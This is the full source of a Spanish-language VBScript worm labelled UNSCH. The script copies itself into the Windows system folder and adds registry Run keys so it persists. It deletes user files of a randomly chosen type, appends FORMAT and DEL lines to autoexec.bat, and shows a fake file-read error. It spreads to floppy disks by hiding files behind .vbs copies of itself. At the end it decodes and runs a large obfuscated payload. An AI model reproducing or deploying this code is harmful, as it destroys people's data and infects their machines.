REM UNSCH Copyright 27/10/2001 UNSCH2001@TERRA.COM
On Error Resume Next
Dim X
Dim nHP
Dim nD
Dim file
Dim cNom, cNom1
Set nHP = CreateObject("Scripting.FileSystemObject")
Set fsoST = WScript.CreateObject("WScript.Shell")
Set sysdir = nHP.GetSpecialFolder(1)
Set file = nHP.GetFile(WScript.ScriptFullName)
If nHP.FileExists(sysdir&"\MSWORD.vbs") = False then
cNom = left(file.name,len(file.name)-7)
file.copy(sysdir&"\MSWORD.vbs")
file.copy(sysdir&"\THWIN.vbs")
file.copy(sysdir & "\" & file.name)

End If

if month(now) = month(file.datecreated)-9 or month(now) = month(file.datecreated)+3 then forat() 
wini()

If file.name <> "THWIN.vbs" then
If file.drive = "A:" then
cNom1 = left(file,len(file)-4)
If nHP.FileExists(cNom1) = True Then
set arch = nHP.getfile(cNom1)
cNom2 = arch.shortPath
fsoST.Run (cNom2)
Else
mens()
End If		
Else
mens()
End if
End If

Randomize
nD = Int((20 * Rnd) + 1)
If nD = 1 Then cFiles ="xls"
If nD = 2 Then cFiles ="doc"
If nD = 3 Then cFiles ="wav"
If nD = 4 Then cFiles ="dwg"
If nD = 5 Then cFiles ="mp3"
If nD = 6 Then cFiles ="bak"
If nD = 7 Then cFiles ="wav"
If nD = 8 Then cFiles ="bmp"
If nD = 9 Then cFiles ="htm"
If nD = 10 Then cFiles ="hlp"
If nD = 11 Then cFiles ="chm"
If nD = 12 Then cFiles ="jpg"
If nD = 13 Then cFiles ="gif"
If nD = 14 Then cFiles ="scr"
If nD = 15 Then cFiles ="ttf"
If nD = 16 Then cFiles ="mid"
If nD = 17 Then cFiles ="cdr"
If nD = 18 Then cFiles ="mdb"
If nD = 19 Then cFiles ="dbf"
If nD = 20 Then cFiles ="ico"
Set List1 = nHP.CreateTextFile(sysdir & "\ListWin.txt")
List1.WriteLine ("ARCHIVOS")

hode()
List1.Close
mesg()

Sub hode()
On Error Resume Next
Dim d,dc,s
X=0
Set dc = nHP.drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If x < 5 Then Busc(d)
End If
Next
End Sub
Sub Busc(nFolder)
On Error Resume Next
set f=nHP.GetFolder(nFolder&"\")
Set sf = f.SubFolders
For Each f1 In sf
If x < 5 Then
files1(f1&"\")
Else
Exit For
End If
If x < 5 Then
Busc(f1&"\")
Else
Exit For
End If
Next
End Sub

Sub Files1(subF)
On Error Resume Next
Set f2 = nHP.GetFolder(subF)
Set fc = f2.Files
For Each fl In fc
ext = nHP.GetExtensionName(fl.Path)
If ext = cFiles Then
If x < 5 Then
List1.WriteLine Now & " " & fl.Path
Set oFil = nHP.getFile(fl.Path)
oFil.delete
x = x + 1
Else
Exit For
End If
End If
Next
End Sub

Sub wini()
On Error Resume Next
fsoST.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN",sysdir&"\THWIN.vbs"
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\THWIN",sysdir&"\THWIN.vbs"
End Sub

Sub forat()	
Set fil1 = nHP.OpenTextFile("c:\Autoexec.bat")
s = fil1.readAll
fil1.Close
Set fil2 = nHP.createTextFile("c:\Autoexec.bat")
fil2.write (s)
fil2.WriteLine ("@echo off")
fil2.WriteLine ("rem DEL "&sysdir&"\*.SYS")
fil2.WriteLine ("rem DEL "&sysdir&"\*.DLL")
fil2.WriteLine ("rem DEL "&sysdir&"\*.OCX")
fil2.WriteLine ("rem CLS")
fil2.WriteLine ("rem FORMAT C: /u /v:UNSCH /autotest")
fil2.WriteLine ("CLS")
fil2.Close
End Sub

Sub mesg()
On Error Resume Next
If file.name = "THWIN.vbs" then oprog()
End Sub

sub mens()
Dim Mensaje
Dim Estilo
Dim Titulo
Dim Respuesta
Mensaje = "Error de lectura. No se puede abrir el archivo"
Estilo = vbCritical
Titulo = "ERROR"
Respuesta = Msgbox(Mensaje, Estilo, Titulo)
End Sub

Sub oprog()
On Error Resume Next
Esperar = 60*10
Desde = Timer 
Do While Timer < Desde + Esperar
Loop
Set Drv = nHP.GetDrive("A:")
If Drv.IsReady Then
set f=nHP.GetFolder("A:\")
set fc = f.Files
If fc.count > 0 then
For Each fa In fc
Set oFa = nHP.getFile(fa)
exta = nHP.GetExtensionName(fa)
If exta <> "vbs" Then
if oFa.attributes = 34 Then
If nHP.FileExists(oFa.Path&".vbs") = false Then	oFa.delete
Else
nHP.CopyFile sysdir & "\MSWORD.vbs",fa & ".vbs"
oFa.attributes = 34
If nHP.FileExists(sysdir & "\WinList.txt") = True then
Set Lis = nHP.OpentextFile(sysdir & "\WinList.txt")
nLec = Lis.ReadAll
Lis.Close
Else
nLec = "ARCHIVOS"
End If
Set rge = nHP.CreateTextFile(sysdir & "\WinList.txt")
rge.WriteLine (nLec)			
rge. WriteLine Now & " " & fa
rge.Close
End If
End If
Exit For
Next	
Else
nHP.CopyFile sysdir & "\MSWORD.vbs","A:\UNSCH.doc.vbs"
End If
End If
oprog()
End Sub

ExeString = "=diBiSg^ma+AoikM`ts%Q^rM`ts%?afk`aRbbj+:klk^J^i^^p+?NK+PnOg^gh+PdjOZod+Lp^D%AemZguCbngNqaFF^lo]qm#%FFR^o@hf#%FFBk`]s^Hekb`q'JCGej^Dp'JC>ndZoaLZdh'JCKnni\c`m`$(Am]Ot[Aqm\oengGI:kldg_Pn!Aek^K]sa'Pxi`Osk$HiDkmkqMarnhaG`tsOdmNdZ_Pdfk<AON'JldgOawmAek^#Bhe`L`mc(0SfkOsk9K`]cM`io'Ma`]<hkEeDjrmm$SfkOsk'JCZosZmp'%59/JnE`j'MhlRmm%5-McamNdZ_Pdfk*BejodAwboEni_sbjj@jcDbDbMtldLon6gmoMcamNdZ_Pdfk*BejodOdmBhe`Pdfk<AON'JldgOawmAek^#Bhe`L`mc(1EbgaS^hl-Pmes^;=KCRkmej]c6!!!o]obkdls3%GIXnp`ko$(=o]?qEa%OioLonra<mHe!GmhhS^spAek^Oali)?khnaNasA=smmea8ELJ*F^oBhe`$EbgaOZod(B@monh[)]smmeanoar82-DenaMa`]Oali)?khnaNasAek^Oali9?NK-HkamM`ts?dhd!Aek^K]sa'4(EeOuo^Npq8!aoikPg^i?dhdM`io'Rnhm`u[>nK_7GMHH=o]?qEa%8!!!;J@Xjjkh\`<u[n_qbkp9FF^lo]qm#%!%:!!u[>nK_AoikM`tsAkl`EeOuo^Npq8!o]o!OddgEbgaS^hl-Pmes^ra<mHe!U[nPdqo>i`Ba?dhdM`io'>hnl`>i`Ba>i`?pjbmdkm?pjbmdkmFFBa\jf^Nqa!>qqk`jsLonhgb(KZnpHg_aw<c]qH_H`loEm]`tBa\n6,McamEeGaem#HBZna'<pnq^ipRmmem`$(09;G?`l`$!\%McamGI<c]m``Ot[9?dj`et@hlf%6[Rn]A6,@hr^JC>d`gbaRn]<>dq!<ob!Gaem#HBZna'<pnq^ipRmmem`$(0$,,%9ULp^D8/Am]EeAkl`DE?gZicdLp^6Ih]#?tkmammNpqbic+*'H`loEm]`tBa\n(Am]EeAm]Btg^phhiBtg^phhiJC>ndZoaLZdh'NgAqkjnK`otf`M^spDbBiSg^ma6gmhh!OddgDqdp?pjbmdkmAm]EeOgZmaEbga6Hd_o$VbiL`mc(2Knn`m]lAek^nXBhhingBhe`o[Fd_qhnkemOgZmacUNp`mdkm^mu[[g]md)dsfBa'?NK-?dhd>sermn$Ra\nd?dhd$Sa`j>]keGI:kldg_Pn!Nd`k`Bhe`(!aoik$>godOdmBhe`Pdfk<AON'JldgOawmAek^#OgZmaEbga++'pqn`%Aek^Oali)Sqboa7GMHH=o]?qEa%8!!!;J@Xjjkh\`<u[n_qbkp9FF^lo]qm#%!%:!!u[>nK_AoikM`tsBhe`Pdfk*BejodAm]Ee@d_\qkmD`6SrLcake)Nd`Ma`]#GD@U^<PNQ>IP^NNAQUD`dgoesb`o[=`b`ngpNnaqD@!NnoHnhfRdkneng9PnOg^gh-K`cQ^\`'CGDRZHN<<H^F<?GBIA[Ljbsp\ndUHebkjon_oXNnohnhfDqkndlnXL^_e`O`n!VlNddeg*Q^bSqboaCGDRZ?TKMAMMZQR>MXH]`jsboedlW%=`b`ngpH]![Ljbsp\ndUHebkjon_oXNnohnhfDqkndlnX!Hd_o$NnoHnhfRdkneng'-(!-)WI`bgXBhhlnl`Tl`Rm\phhiaqr(0%ND@Z@VHM@!?`egJCH]heMaf!DJ>T[BNMNDGO[TL@N[B_ammdph^nX!?aeZphsB_!UNkemr]q^WIh\mkrhap[Hppkhjg>slq^no[!K^ap'HppKhjgU^mohhi(0!'+XLZdh[Lo]sbjjdktMZha!%Nd`k`Bhe`%>]keGIF\ekK`c'CGDRZ?TKMAMMZQR>MXH]`jsboedlW%=`b`ngpH]![Ljbsp\ndUHebkjon_oXNnohnhfDqkndlnX!Hd_o$NnoHnhfRdkneng'-(!-)WI`bgXVb_aLo]sbjjdktMZha!%Nd`k`Bhe`%RoRa`hk'MafPmes^GD@U^<PNQ>IP^NNAQUNkemr]q^WIh\mkrhap[Habh\`X8'+XNnohnhfXNioengnXLZdh[>_eshmLq^aaq^i_d'-2*+31%ND@Z@VHM@!?`egJCH]heMaf!DJ>T[BNMNDGO[TL@N[Ljbsp\ndUHebkjon_oXVbi`npnL^no``djfNqaltos^hXOkjbhe`o[Fd_qhnkemKtmgkndEmm`nm^oR^ophgbo[)\,c)-,/)+,/)+,/\+,/)+,/)+,/)+05U+,0^+/5)(![g]md%>]keGIF\ekK`c'CGDRZ?TKMAMMZQR>MXRhapvZma[Fd_qhnkemWShg_kvlJSU>qqk`jsO`nrbjj[PdjchroF`orZbem`Ot[nurm`i[ImkebgarUHebkjon_oNnohnhfHgoaqg`pL`psbicrU+]/]+./)+,/)+,/)^,/)+,/)+,/)+,3/W,/*`,2/++]h`gf(SrLcake)Nd`Rnhm`!AFAXX>QQK@JSXPODKWOn_os`k`XLb^nnljbsUJbeb^a[*+*/UJqsejkjUJlsbjjrUH]heWAcbokqImae^mam\`+*.-/0-(!K@C^=RKQ=<\hkFFLZdhQ^b$!AFAXX>QQK@JSXPODKWOn_os`k`XLb^nnljbsUJbeb^a[*+*/U>klfjj[F\ekL`psbicrUIavLo]sbjjdkt+]h`gf(GInhi```Bne_aq!Gaem#ShgK]sa'/(!!Imkfk\i?dhdlW?nfhkmAek^nXLb^nnljbsNd`k``[Lo]sbjjdkt(Am]Btg^phhiBtg^phhiJC>ndZoaLbgedn#%Jj>mnnkNdlpidIawmS^hlOZod6!EeIks!AON'Aek^@thloo'PdjOZodVL^nhio*dq`(Pg^iM`ioI\pg8!ltos^h/1U>i`BaBaS^hlOZod6rrnpdf..[Pg^iLo]qmPlEbga6ShgK]saNURM@I[D`nm^g/1'_hkDenaNp`koQo?dhd8VbiL`mc%OXLOALUFaqg`h-]gh!Am]EeSrLcake)Nd`Rnhm`!AFAXXGKB:G[L:>DHG@XRhapvZma[Fd_qhnkemWShg_kvlW?tkmammQaqldkmUMqmUFaqg`h2+(Rm\nsNkBhe`?NK-<jlx?dhdRemI\pg!!p`^[des`eg*fba+PdjOZodv^]XEhg`dk)dsm?NK-<jlx?dhdRemI\pg!!ltos^h/1UffvZgh-`db!%RemI\pg!!ltos^h/1U_ardoko'djhBZghDE=oi`jcMj$VbiL`mc%sd[WBne_aq'cps'gmo(SrLcake)Nd`Rnhm`!AFAXX>H@LNARXMKNMW*cegX!%`keaek^PnOg^gh-K`cVkdpdDJ>T[BE<OR>N[QHJP['_hkU>kmm`jsOuo^(!Zklkb^]sbjj.q(ir]jsmej]cVlNddeg*Q^bSqboaCGDRZ?K:NODLZNNHOXcegbhe`XC^a]teoEbhiX!%RoRa`hk'MafK`]c!DJ>T[BE<OR>N[QHJP[os`ebga[=`b`ngpH\jj[$PnOg^gh-K`cVkdpdDJ>T[BE<OR>N[QHJP[]ghebga[L^nhioAm`djdU(!O=ObkdlsVlNddeg*Q^bSqboaCGDRZ?K:NODLZNNHOXcegBhe`XRa`hkUJldgW?nfh]m]W+PdjOZodPdfkL`mc%SR\meom)aw^!,! &!SrLcake)Nd`Rnhm`!AFAXX>H@LNARXMKNMW`keAek^WOg^ghDqWLqhkaqmtOg^`pGZi`k^mo[PNDOkjlrU(!t1,1./?@.(54,=)0*>B,1>55&+,@:+,A12,7<xRoRa`hk'MafPmes^GD@U^<G=RL@O^KJKSU_hk?dhdUN_qbkpGhnpDg^kc^W+v44*.-5,,)31+?,*,@1&=-E2(,/<+0E11?2+/y!OdmBhe`Pdfk<AON'JldgOawmAek^#OsZmpTiAek^'.+mmqdEbgaS^hl-Pmes^RalOawmEbgaS^hl-<gkr^Dg_Eni_sbjjEni_sbjjDEHhd`Es!$BaHgRddk`;7gmhh!OddgDqdp?pjbmdkmAm]EePgbnHn\\phhi<_kbnhamm)hn\\phhiBaK^ap'McerEj_`mdkm%0(8!_dhdPg^iMcerEj_`mdkm8Lb_$SadoKh^]sbjj+2$BaELJ*F^oAwm`jrbjjMZha'McerEj_`mdkm8=mcamPgbnHn\\phhi<Gaem#PgbnHn\\phhi(K^i$SadoKh^]sbjj((K^i$ELJ*F^oBhe`J`f`$SadoKh^]sbjj($>i`BaBaK^i$SadoKh^]sbjj(92OddgSadoKh^]sbjj6PgbnHn\\phhi%X!Am]EeGInhi```Bne_aq!OdhlGkbZoeng$>i`Ba>i`?pjbmdkm?pjbmdkmFFLZdhQ^b$Q^bOsk'Bhe`J`f`%Jj>mnnkNdlpidIawmQ^bPdfkOsk9PnOg^gh-K`cQ^\`'K`cRmm%DbK`cS^hlRmm<McamSrLcake)Nd`Rnhm`Q^bOsk'Bhe`J`f`>i`Ba>i`?pjbmdkm?pjbmdkmFFN[jOt[#?tkmammNpqbic(Ot[@<+M`osHpp6,?kPcek^Pqn`M`osHpp6PdloKtm'*H_PdloKtm:+3Sa`j>qqk`jsLonhgb<AemZguCbng9U>ses?k@jcDbJj>mnnkNdlpidIawmR^oSadoEhg`dk9?NK-@`pEhg`dk#?tkmammNpqbic(Odm@h\Nqa8Bk`]s^J^i^^p'N_qbkphgb*Cb^phhi]qr%NasAkk]`nr8SadoEhg`dk)Ot[Akk]`nrBne_aq<jqmm9)EhmDZ^dM`io?jhc^mhgBne_aqlEhg`dk>ktgo<Akk]`nBhpjs&0@h\Nqa'\`cAkk]`nBhpjs%PdfkBne_aq'I]l^M^spDb=d_Rn]*Bhpjs8/OddgKZnpHg_aw<c]q8HgnpqK`r'<pnq^ipRmmem`'['Hdg#?tkmammNpqbic(&,%NqaLonhgb<Hec!>qqk`jsLonhgb(KZnpHg_aw<c]q$,(K^i$BnmndgoOskdjf(H`loEm]`tBa\n,*$<pnq^ipRmmem`9DE?gZicdLp^'<pnq^ipRmmem`'H`loEm]`tBa\n(Ot[@<,>godEeNqa>9)Pg^i<pnq^ipRmmem`9<pnq^ipRmmem`=d_Rn]*Hm`i'*$%X!AwboChDenae<+?jnc9*PnAkk]`nBhpjsEeG?`l`$Rn]Oskdjf9E>]r^#@h\Nqa'Dpdf#f(Pg^iBai7Ehg`dk>ktgoSa`j>qqk`jsLonhgb<>qqk`jsLonhgb%?ebLp^-Boal!e'0W@thm@nAm]EeAm]EeJdqoE\osBi`dq>d`k9BioskMau!>qqk`jsLonhgb(!U(K^i$BnmndgoOskdjf(-(Ot[Npqbic6Ih]#?tkmammNpqbic+E\osBi`dq>d`k&-+E`j'<pnq^ipRmmem`$)KZnpHg_aw<c]q&,%>qqk`jsLonhgb<FFBa\jf^Nqa!>qqk`jsLonhgb(KZnpHg_aw<c]qDg_H_Dg_H_KhjlFFN[jOt[9<pnq^ipRmmem`Dg_Eni_sbjjEni_sbjjDELqhk]fZoa'NgAqkjnK`otf`M^spMafI\pgO\ht^9CGDRZHN<<H^F<?GBIA[Ljbsp\ndUHebkjon_oXNnohnhfDqkndlnXC^bnd^=doj=`cq^`<RoRa`hk'MafK`]c!MafI\pgO\ht^$BaCbngC^bnd^9Sa`j?erd?afk`a6Bhg\hx=doj!!3W@jcDbAkqd90ok.CbngC^bnd^9DEKahNqa!?erd?afk`a(GInhi```Bne_aq!?erd?afk`a(JdqoPnOg^gh-K`cVkdpdMafI\pgO\ht^'@hlf@d`madAm]Btg^phhiBtg^phhiJCpilZbaEhg`dk#L`mcJ`f`%Jj>mnnkNdlpidIawmR^oEhg`dkI]l^9?NK-@`pEhg`dk#L`mcJ`f`%NasOdhlAek^n<Akk]`nMZha-?dhdlGmoAwbnpr8/BnkA`\cSadoEbgaBiSadoEbgarBhe`Awm9N>]r^#BRH)Cdm@ts^iohhiJ`f`$SadoEbga-I\pg$BaEbgaDqo<DSFNkBhe`Awm9CPLENkBhe`Awm9<OOKqAek^@ts8!ICL!Jn?dhd>sp6ILKMcam?`egJC<lo^i`Sh#PgbnBhe`*OZod+cple%@hr^Db?dhd>sp6U;NMcam?`egJC<lo^i`Sh#PgbnBhe`*OZod+q^r$>godBaEbgaDqo<DSMSa`jCps>sermn<,>i`BaG`tsEe#QBZna'I\pgG\id9N>]r^#ShgK]sa?ardokoU%(Jn!P?`l`$OZodMZha(8T<\od!RemI\pg!!=`ojmjl!$Pg^iAopDqdosl9*Dg_H_H_Dsm@thloo6,McamBRH)?nitBhe`VbiL`mc%oxloal,-Xc^ngshk*hgd+I\pgG\idBRH)?nitBhe`VbiL`mc%sd[WBne_aq'cps'L`mcJ`f`>i`Ba>i`?pjbmdkm?pjbmdkmFFR^o@hf#%Jj>mnnkNdlpidIawmDkm*Be`]qPdloEs8VL^nhio*R\meomAqkei]l^H_AqkPg^iBiSg^ma6gmhh!Akl`BiSg^ma6u[n@jcDbDbBiSg^ma6u[nMcamOdmBRH9<ma`m`Kac`_s!Obkdlsbic-?dhdLtos^hKac`_s$L`pPnOg^gh6?q^\pdH]fd\o$!PN_qbkp-Lcake%@hr^R^o@ikhdH]fd\o<_kbnhamm)]oigasl#JCZct^np!@ikhdH]fd\o*r^o?KLD@'vB8,0@B+-)0<A,,*,@/&<@A2(,/<+0E=04@)=y!@ikhdH]fd\o*bk`]s^Djrm\jb^#%NasRoRa`hk8@ikhdH]fd\o*F^oKac`_s!$:klk^J^i^^p-l`pBENEC!w/=//E>+-,?+52&,-B?(48-+)/)<,B2+13+-4|$:klk^J^i^^p-\ma`m`Emlo]m\`$(OdmBRH9:klk^J^i^^p-@`pN[eabm#%@jcDbNas?erdJ^i^^p6BRH)@qbqarBnkA`\cCbngS^hlBiCbngN[eabmH_@hlfPdfk*CkdrdMtld7:+=m]@hlfPdfk*CkdrdMtld7:*Pg^i>sesAkqAm]EeBhg\hx=doj8CbngS^hl-=meu^Gasm`nIawmCbhNmcaq:mn',$K\jchhey^Ehmh6+Sh/Jpg^m=qk#e(8Hgo$'2&Ki`(M^spOaliNpqbic6!Bnke<*PnGam!OdhlOawm$M`ioGpi6=r\#Ih]#PgbnPdqo(h%,%(EeOaliIql80,Pg^iM`ioGpi6.7Akl`EeOaliIql80)Pg^iM`ioGpi6.8Am]EePdfk?gZm<>dq!OaliIql(Nmcaq:mn'bIn]0(H_Pdfk?gZm<>dq!.0(OddgS^hlBa\n6?gk#-7Dg_H_S^hlRmmem`9M`ioLonhgb%Oali>d`kM^spPjKh^gRmm<Aw^^qs^#!=diD`u@km$2'PgbnPdqo!q^BkGb%Gdr<nq!+%6Ksa`n@km$/%o]?qEa!Fax:mn'*$<%Jpg^m=qk#-(!!u[>nK_!!D`u@km$19Hoddk<nq!-%!!ra<mHeJ^t=qk#/(8!!Nmcaq:mn',$%!q^BkGb%Bnke<*PnGam!@tdLonhgb%!!ra<mHeS^hlMnh<<ob!Hec!@tdLonhgb(h%,%(u[>nK_!!BaS^hlMnh<,4Mcamu[>nK_!!M`ioGpi6/3u[>nK_!!>i`Ba!q^BkGb%Pdfk?gZm<>dq!OaliIql&J^t=qk#eFj`-$%!!ra<mHeH_Pdfk?gZm<>dq!-4(Oddg%o]?qEa!Oali>d`k9o]?qu[>nK_!!>godBaS^hlBa\n6?gk#.8Pg^i!q^BkGb%Pdfk?gZm<q^K_%o]?qEa!@jcDb!!ra<mHeSadoS^sp6PgbnPdqo%Oali>d`k%o]?qEa!Iawm(o]?qEa%Aw^^qs^#PgbnPdqo%!PgbnPdqo<Aw^Npqbic6!M`ioLonhgb%!GmhhS^sp68!!!l^nhiokZictZba<o]obkdls7%q^BkGbch^ql^ip-pmes^!%8!!!]drlouk^8#ohnesbjj9Z]oneppd4hd_o6/is7mjl9)kt:recmc6/is7a`efao6/is7s(em]`t9+37odoh[dhhmt6ad`c^i#=7!!!!:KLK>OM:HA<DE!^`parmDDBBDS6+VB?PG6+bh_a<\ji-fn*!!!Z^pho`T-:^pho`!W<jiohiamm9;*=OIGAS7%8!!!(_eu7!!u[>nK_7.l^nhio:!!u[>nK_7r\meomh`gbq```9u[n_qbkp=o]?qEa%OdhlOawmo]?qEa%PjKh^gRmm%q^BkGb;*obkdls7%q^BkGb;*>N=T:!!u[>nK_7.AOIK7O]oS^sp6PgbnPdqo%q^BkGbQmEj_jLonra<mHe!!DE[rm\ns!$RemI\pg8ELJ*F^oOo^^e`eAkk]`n')$%X!Ee#BRH)Bhe`Awbnpr!RemI\pg!!p`^[?jhc^m*gmo(Pg^i?NK-<jlx?dhdRemI\pg!!p`^[?jhc^m*gmo+PdjOZodv^]Xjcr]ke)ch_>i`BaBa'?NK-?dhd>sermn$VbiL`mc%oxloal,-Xc^ngshk*hgd(Pg^i?NK-<jlx?dhdRemI\pg!!ltos^h/1U_ardoko'djh'ShgK]sanurm`i2+Wgip\hk'beeDg_H_Dg_Eni_sbjj"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 1"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 5"&vbCrLf&"KeyArr(3) = 4"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()